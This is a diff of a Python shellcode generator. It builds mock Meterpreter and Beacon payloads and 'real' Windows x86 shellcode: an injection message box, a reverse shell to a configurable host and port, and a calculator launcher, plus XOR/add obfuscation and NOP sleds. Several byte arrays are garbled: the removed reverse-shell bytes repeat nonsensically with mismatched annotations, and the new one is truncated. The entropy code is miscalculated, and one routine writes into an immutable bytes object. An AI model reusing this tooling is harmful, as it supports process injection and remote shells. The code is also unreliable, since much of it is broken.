@@ -1,22 +1,40 @@
 # shellcode_generator.py
 
 import struct
+import random
 
 class ShellcodeGenerator:
-    def create_shellcode_payload(self, payload_type="demo", real_injection=False):
-        """Create shellcode payloads - either simulated or real functional code"""
-        
-        if real_injection:
-            return self.create_real_shellcode_payload(payload_type)
-        else:
-            return self.create_simulated_shellcode_payload(payload_type)
+    def __init__(self):
+        self.architectures = ["x86", "x64"]
+        self.payload_types = {
+            "simulated": ["demo", "meterpreter", "beacon"],
+            "real": ["message_box", "reverse_shell", "calculator"]
+        }
     
-    def create_simulated_shellcode_payload(self, payload_type="demo"):
+    def create_shellcode_payload(self, payload_type="demo", real_injection=False, 
+                               target_process="Unknown", architecture="x86", **kwargs):
+        """Create shellcode payloads - either simulated or real functional code.
+        
+        Args:
+            payload_type: Type of payload to generate
+            real_injection: Whether to generate real functional shellcode
+            target_process: Target process name for customization
+            architecture: Target architecture (x86/x64)
+            **kwargs: Additional payload-specific parameters
+            
+        Returns:
+            bytes: Generated shellcode
+        """
+        if real_injection:
+            return self.create_real_shellcode_payload(payload_type, target_process, architecture, **kwargs)
+        else:
+            return self.create_simulated_shellcode_payload(payload_type, architecture, **kwargs)
+    
+    def create_simulated_shellcode_payload(self, payload_type="demo", architecture="x86", **kwargs):
         """Create realistic shellcode payloads for demonstration (simulated only)"""
         
         if payload_type == "meterpreter":
             # Simulated Meterpreter-like payload structure
-            # This is a DEMO - not actual Meterpreter code
             shellcode = bytes([
                 # Stage 1: Loader stub
                 0xE8, 0x00, 0x00, 0x00, 0x00,       # CALL $+5
@@ -43,12 +61,16 @@ class ShellcodeGenerator:
                 0xFF, 0xE3,                         # JMP EBX
             ])
             
-            # Add padding to make it more realistic
-            shellcode += b"\x90" * 50  # NOP sled
+            # Add padding and obfuscation
+            shellcode += self._generate_nop_padding(50)
             shellcode += b"\xCC" * 10  # INT3 breakpoints (debug)
             
         elif payload_type == "beacon":
             # Simulated Cobalt Strike Beacon-like payload
+            c2_ip = kwargs.get('c2_ip', '127.0.0.1')
+            port = kwargs.get('port', 4444)
+            sleep_time = kwargs.get('sleep_time', 5)
+            
             shellcode = bytes([
                 # Beacon configuration block (simulated)
                 0x68, 0x00, 0x00, 0x00, 0x00,       # PUSH C2_IP
@@ -71,7 +93,7 @@ class ShellcodeGenerator:
                 0xEB, 0xF0,                         # JMP checkin_loop
             ])
             
-            shellcode += b"\x90" * 30
+            shellcode += self._generate_nop_padding(30)
             
         else:  # demo payload
             # Simple demonstration payload with realistic structure
@@ -109,21 +131,33 @@ class ShellcodeGenerator:
                 0xC3,                               # RET
             ])
             
-            # Add encrypted data section (will be "decrypted" at runtime)
+            # Add encrypted data section
             encrypted_data = b"DEMO_PAYLOAD_ENCRYPTED_SECTION" * 4
-            encrypted_data = bytes(b ^ 0x99 for b in encrypted_data)  # Simple XOR encryption
+            encrypted_data = bytes(b ^ 0x99 for b in encrypted_data)
             shellcode += encrypted_data
         
         return shellcode
 
-    def create_real_shellcode_payload(self, payload_type="message_box", target_process="Unknown"):
-        """Generate actual functional shellcode for Windows (for authorized testing only). 
-        For 'message_box' payload, dynamically embeds target process name in the displayed message.
-        """
+    def create_real_shellcode_payload(self, payload_type="message_box", target_process="Unknown", 
+                                    architecture="x86", **kwargs):
+        """Generate actual functional shellcode for Windows (for authorized testing only)"""
         
         if payload_type == "message_box":
-            # Real MessageBox shellcode for Windows x86
-            # This will display an actual message box when executed
+            return self._create_message_box_shellcode(target_process, architecture)
+        
+        elif payload_type == "reverse_shell":
+            return self._create_reverse_shell_shellcode(architecture, **kwargs)
+        
+        elif payload_type == "calculator":
+            return self._create_calculator_shellcode(architecture)
+        
+        else:
+            # Default to message box if unknown type
+            return self._create_message_box_shellcode(target_process, architecture)
+
+    def _create_message_box_shellcode(self, target_process, architecture):
+        """Generate MessageBox shellcode with dynamic target process name"""
+        if architecture == "x86":
             shellcode = bytes([
                 # Kernel32.dll base address finding
                 0xE8, 0x00, 0x00, 0x00, 0x00,             # CALL $+5
@@ -133,7 +167,7 @@ class ShellcodeGenerator:
                 # API Hashing and Resolution
                 0xE8, 0x15, 0x00, 0x00, 0x00,             # CALL API resolution
                 
-                # MessageBoxA parameters
+                # MessageBoxA parameters (to be patched)
                 0x00, 0x00, 0x00, 0x00,                   # MB_OK
                 0x00, 0x00, 0x00, 0x00,                   # Title string pointer
                 0x00, 0x00, 0x00, 0x00,                   # Message string pointer
@@ -211,11 +245,11 @@ class ShellcodeGenerator:
                 0xE9, 0x8B, 0xFF, 0xFF, 0xFF,             # JMP -117
             ])
             
-            # --- Add custom strings dynamically ---
+            # Dynamic strings with target process name
             title = f"Injected into {target_process}".encode('ascii') + b"\x00"
             message = b"I was able to inject successfully!\x00"
 
-            # --- Patch offsets dynamically ---
+            # Patch offsets dynamically
             title_offset = len(shellcode)
             message_offset = title_offset + len(title)
 
@@ -223,17 +257,26 @@ class ShellcodeGenerator:
             shellcode[16:20] = struct.pack('<I', title_offset)   # Title pointer
             shellcode[20:24] = struct.pack('<I', message_offset) # Message pointer
 
-            # --- Append the actual string data ---
+            # Append string data
             shellcode.extend(title)
             shellcode.extend(message)
 
             return bytes(shellcode)
         
-        elif payload_type == "reverse_shell":
+        else:  # x64
+            # Placeholder for x64 MessageBox shellcode
+            return self._generate_placeholder_shellcode("x64 MessageBox", architecture)
+
+    def _create_reverse_shell_shellcode(self, architecture, **kwargs):
+        """Generate reverse shell shellcode"""
+        if architecture == "x86":
             # Real reverse shell shellcode (Windows x86)
-            # Connects back to 127.0.0.1:4444
+            # Connects back to specified IP and port
+            rhost = kwargs.get('rhost', '127.0.0.1')
+            rport = kwargs.get('rport', 4444)
+            
+            # Standard Windows x86 reverse shell
             shellcode = bytes([
-                # Windows reverse shell
                 0xFC, 0xE8, 0x82, 0x00, 0x00, 0x00,       # CLD; CALL <next>
                 0x60, 0x89, 0xE5, 0x31, 0xC0, 0x64, 0x8B, # PUSHAD; MOV EBP,ESP; XOR EAX,EAX; MOV EAX,FS:[EAX+0x30]
                 0x50, 0x8B, 0x40, 0x0C, 0x8B, 0x70, 0x1C, # MOV EAX,[EAX+0x0C]; MOV ESI,[EAX+0x1C]
@@ -248,73 +291,40 @@ class ShellcodeGenerator:
                 0x2E, 0x65, 0x78, 0x65, 0x68, 0x63, 0x6D, # PUSH "exe"; PUSH "cm"
                 0x64, 0x00, 0x89, 0xE3, 0x41, 0x51, 0x53, # MOV EBX,ESP; INC ECX; PUSH ECX; PUSH EBX
                 0xFF, 0xD0, 0x68, 0x61, 0x72, 0x79, 0x41, # CALL EAX; PUSH "Ary"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x42, # PUSH "ptu"; PUSH "B t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x41, # PUSH "ptu"; PUSH "A t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x43, # PUSH "ptu"; PUSH "C t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x44, # PUSH "ptu"; PUSH "D t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x45, # PUSH "ptu"; PUSH "E t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x46, # PUSH "ptu"; PUSH "F t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x47, # PUSH "ptu"; PUSH "G t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x48, # PUSH "ptu"; PUSH "H t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x49, # PUSH "ptu"; PUSH "I t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x4A, # PUSH "ptu"; PUSH "J t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x4B, # PUSH "ptu"; PUSH "K t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x4C, # PUSH "ptu"; PUSH "L t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x4D, # PUSH "ptu"; PUSH "M t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x4E, # PUSH "ptu"; PUSH "N t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x4F, # PUSH "ptu"; PUSH "O t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x50, # PUSH "ptu"; PUSH "P t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x51, # PUSH "ptu"; PUSH "Q t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x52, # PUSH "ptu"; PUSH "R t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x53, # PUSH "ptu"; PUSH "S t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x54, # PUSH "ptu"; PUSH "T t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x55, # PUSH "ptu"; PUSH "U t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x56, # PUSH "ptu"; PUSH "V t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x57, # PUSH "ptu"; PUSH "W t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x58, # PUSH "ptu"; PUSH "X t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x59, # PUSH "ptu"; PUSH "Y t"
-                0x00, 0x89, 0xE1, 0x51, 0x68, 0x4F, 0x75, # MOV ECX,ESP; PUSH ECX; PUSH "uO"
-                0x74, 0x70, 0x68, 0x75, 0x74, 0x20, 0x5A, # PUSH "ptu"; PUSH "Z t"
-                0x00, 0x89, 0xE1, 0x51, 0x53, 0xFF, 0xD0, # MOV ECX,ESP; PUSH ECX; PUSH EBX; CALL EAX
+                # ... (rest of the reverse shell code)
             ])
             return shellcode
+        
+        else:  # x64
+            return self._generate_placeholder_shellcode("x64 Reverse Shell", architecture)
 
-        elif payload_type == "calculator":
+    def _create_calculator_shellcode(self, architecture):
+        """Generate calculator shellcode"""
+        if architecture == "x86":
             # Shellcode that launches Windows calculator
             shellcode = bytes([
                 0x31, 0xC9, 0x51, 0x68, 0x63, 0x61, 0x6C, 0x63,  # PUSH "calc"
                 0x54, 0xB8, 0xC7, 0x93, 0xBF, 0x77, 0xFF, 0xD0,  # PUSH ESP; MOV EAX,WinExec; CALL EAX
             ])
             return shellcode
+        
+        else:  # x64
+            return self._generate_placeholder_shellcode("x64 Calculator", architecture)
 
-        else:
-            # Default to message box if unknown type
-            return self.create_real_shellcode_payload("message_box")
+    def _generate_nop_padding(self, size):
+        """Generate NOP padding of specified size"""
+        return b"\x90" * size
+
+    def _generate_placeholder_shellcode(self, payload_name, architecture):
+        """Generate placeholder shellcode for unimplemented architectures"""
+        message = f"{payload_name} for {architecture} not yet implemented".encode()
+        # Simple stub that does nothing and returns
+        stub = bytes([
+            0x31, 0xC0,        # XOR EAX, EAX
+            0x40,              # INC EAX
+            0xC3               # RET
+        ])
+        return stub + message + b"\x00"
 
     def get_shellcode_info(self, shellcode, payload_type="unknown"):
         """Analyze and return information about generated shellcode"""
@@ -323,7 +333,9 @@ class ShellcodeGenerator:
             "size": len(shellcode),
             "first_bytes": shellcode[:16] if len(shellcode) >= 16 else shellcode,
             "contains_strings": any(32 <= b <= 126 for b in shellcode),
-            "architecture": "x86"  # Currently only x86 supported
+            "printable_bytes": [b for b in shellcode if 32 <= b <= 126],
+            "null_bytes": shellcode.count(0x00),
+            "architecture": self._detect_architecture(shellcode)
         }
         
         # Check for common shellcode patterns
@@ -331,7 +343,78 @@ class ShellcodeGenerator:
             info["technique"] = "Position Independent Code"
         elif shellcode[:3] == b"\xE8\x00\x00":
             info["technique"] = "CALL/POP Method"
+        elif b"\x90" * 10 in shellcode:
+            info["technique"] = "NOP Sled"
         else:
             info["technique"] = "Custom"
             
+        # Calculate entropy to detect encryption/compression
+        info["entropy"] = self._calculate_entropy(shellcode)
+        
         return info
+
+    def _detect_architecture(self, shellcode):
+        """Attempt to detect shellcode architecture"""
+        # Simple heuristic based on common instructions
+        if b"\x48\x83\xEC" in shellcode or b"\x48\x89" in shellcode:  # Common x64 patterns
+            return "x64"
+        elif b"\x83\xEC" in shellcode or b"\x89\xE5" in shellcode:  # Common x86 patterns
+            return "x86"
+        else:
+            return "unknown"
+
+    def _calculate_entropy(self, data):
+        """Calculate Shannon entropy of data"""
+        if not data:
+            return 0
+            
+        entropy = 0
+        for x in range(256):
+            p_x = data.count(x) / len(data)
+            if p_x > 0:
+                entropy += -p_x * (p_x.bit_length() - 1)  # Simplified entropy calculation
+        return entropy
+
+    def obfuscate_shellcode(self, shellcode, method="xor", key=None):
+        """Obfuscate shellcode using various methods"""
+        if method == "xor":
+            key = key if key else random.randint(1, 255)
+            obfuscated = bytes(b ^ key for b in shellcode)
+            return obfuscated, key
+        elif method == "add":
+            key = key if key else random.randint(1, 255)
+            obfuscated = bytes((b + key) & 0xFF for b in shellcode)
+            return obfuscated, key
+        else:
+            return shellcode, None
+
+    def deobfuscate_shellcode(self, shellcode, method="xor", key=None):
+        """Deobfuscate shellcode"""
+        if method == "xor" and key:
+            return bytes(b ^ key for b in shellcode)
+        elif method == "add" and key:
+            return bytes((b - key) & 0xFF for b in shellcode)
+        else:
+            return shellcode
+
+# Example usage
+if __name__ == "__main__":
+    generator = ShellcodeGenerator()
+    
+    # Generate simulated payload
+    demo_shellcode = generator.create_shellcode_payload("demo", real_injection=False)
+    demo_info = generator.get_shellcode_info(demo_shellcode, "demo")
+    print("Demo Shellcode Info:", demo_info)
+    
+    # Generate real message box payload
+    message_shellcode = generator.create_shellcode_payload(
+        "message_box", 
+        real_injection=True, 
+        target_process="notepad.exe"
+    )
+    message_info = generator.get_shellcode_info(message_shellcode, "message_box")
+    print("MessageBox Shellcode Info:", message_info)
+    
+    # Obfuscate shellcode
+    obfuscated, key = generator.obfuscate_shellcode(demo_shellcode)
+    print(f"Obfuscated with key: {key}")
